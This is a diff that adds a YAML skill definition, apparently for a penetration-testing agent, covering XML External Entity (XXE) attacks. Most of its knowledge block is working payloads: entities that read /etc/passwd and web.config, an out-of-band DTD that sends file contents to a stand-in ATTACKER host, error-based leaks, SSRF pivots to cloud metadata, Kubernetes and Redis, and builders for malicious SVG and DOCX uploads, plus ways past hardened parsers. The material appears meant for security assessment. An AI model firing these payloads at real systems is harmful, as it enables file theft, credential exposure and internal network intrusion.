@@ -1,0 +1,115 @@
+schema_version: 1
+version: 3.0.0
+name: xxe-advanced
+description: >
+  Advanced XML External Entity (XXE) injection assessment covering classic file read,
+  blind XXE via OAST, out-of-band data exfiltration, XXE-to-SSRF pivoting, error-based
+  XXE, parameter entity chaining, and bypass techniques for hardened XML parsers.
+  Includes JSON-to-XML content-type switching and SVG/Excel/DOCX attack vectors.
+triggers:
+  - xxe
+  - xml external entity
+  - xml injection
+  - doctype
+  - dtd
+  - entity injection
+  - xml ssrf
+  - svg xxe
+  - excel xxe
+  - blind xxe
+  - oob xxe
+  - out-of-band xxe
+tools:
+  - curl
+  - httpx
+  - python3
+knowledge: |
+  XXE vulnerabilities occur when XML parsers process external entity references without restriction.
+  Modern applications rarely accept raw XML directly, so test JSON→XML switching, SVG uploads,
+  DOCX/XLSX processing, and SAML/SOAP endpoints. Always start with blind OAST before file reads.
+
+  1. ATTACK SURFACE DISCOVERY:
+     Direct XML endpoints: Content-Type application/xml, text/xml, application/soap+xml
+     Hidden XML: Content-Type application/json → switch to application/xml (same route, different parser)
+     File upload vectors: SVG, DOCX, XLSX, PPTX, XML configuration files
+     SAML assertions (base64-decoded XML in SAMLResponse parameter)
+     JSON with XML-bearing fields: {"query": "<xml>...</xml>"}
+
+  2. CLASSIC XXE — FILE READ:
+     Basic test (Linux passwd file — non-destructive):
+       POST /process -H "Content-Type: application/xml" -d '
+       <?xml version="1.0" encoding="UTF-8"?>
+       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+       <root><data>&xxe;</data></root>'
+     Windows targets:
+       file:///C:/Windows/System32/drivers/etc/hosts
+       file:///C:/inetpub/wwwroot/web.config
+
+  3. BLIND XXE VIA OAST (When Response Contains No Entity Value):
+     Step 1: Confirm outbound from target server via DNS:
+       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://UNIQUE.oast.fun/xxe-test"> ]>
+       <root><data>&xxe;</data></root>
+     Step 2: If DNS hits (not HTTP), escalate with parameter entities and external DTD:
+       Serve this DTD file at http://ATTACKER/malicious.dtd:
+         <!ENTITY % file SYSTEM "file:///etc/passwd">
+         <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?c=%file;'>">
+         %eval;
+         %exfil;
+       Payload referencing external DTD:
+         <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER/malicious.dtd"> %xxe; ]>
+
+  4. ERROR-BASED XXE (No Outbound Connectivity):
+     When no outbound, trigger XML parser error that includes file content:
+       <!DOCTYPE foo [
+         <!ENTITY % file SYSTEM "file:///etc/passwd">
+         <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+         %eval; %error;
+       ]>
+     Parser error message leaks file content in the error response.
+
+  5. XXE-TO-SSRF PIVOT:
+     Use XXE to initiate SSRF against internal services:
+       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://kubernetes.default.svc/api/v1/"> ]>
+       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"> ]>
+
+  6. SVG XXE (File Upload):
+     Create malicious SVG with embedded DTD:
+       echo '<?xml version="1.0" standalone="yes"?>
+       <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+       <svg><text>&xxe;</text></svg>' > payload.svg
+     Upload as avatar/image; trigger rendering via <img> or server-side renderer.
+
+  7. DOCX/XLSX XXE:
+     Office Open XML (OOXML) files are ZIP archives containing XML:
+       mkdir -p docx_payload/word
+       cp original.docx /tmp/ && cd /tmp && unzip original.docx -d docx_dir
+       # Edit docx_dir/[Content_Types].xml or word/document.xml to inject XXE DTD
+       echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+       <Types xmlns="..."><Default Extension="rels" ContentType="..."/>&xxe;</Types>' \
+         > docx_dir/\[Content_Types\].xml
+       cd docx_dir && zip -r /tmp/payload.docx .
+
+  8. BYPASS TECHNIQUES:
+     Encoding variations: UTF-16, UTF-32 (if parser accepts, may bypass string match filters)
+     DOCTYPE splits across CDATA sections (parser-dependent)
+     Nested parameter entities for evasion in some configurations
+     XInclude (when DOCTYPE is blocked but XInclude is processed):
+       <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+         <xi:include parse="text" href="file:///etc/passwd"/></foo>
+     JSON→XML: set Content-Type application/xml on JSON endpoint and test if parsed as XML
+
+  VALIDATION:
+     a. File read: passwd/hosts content in HTTP response or error message
+     b. Blind XXE: OAST DNS hit confirming outbound from target server
+     c. XXE-to-SSRF: metadata endpoint response via file entity
+     d. Document exact parser, framework, and XML feature (external entities, XInclude)
+references:
+  - https://portswigger.net/web-security/xxe
+  - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  - https://attack.mitre.org/techniques/T1059/
+  - https://github.com/swisskyrepo/PayloadsAllTheThings
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/xxe-advanced.yaml
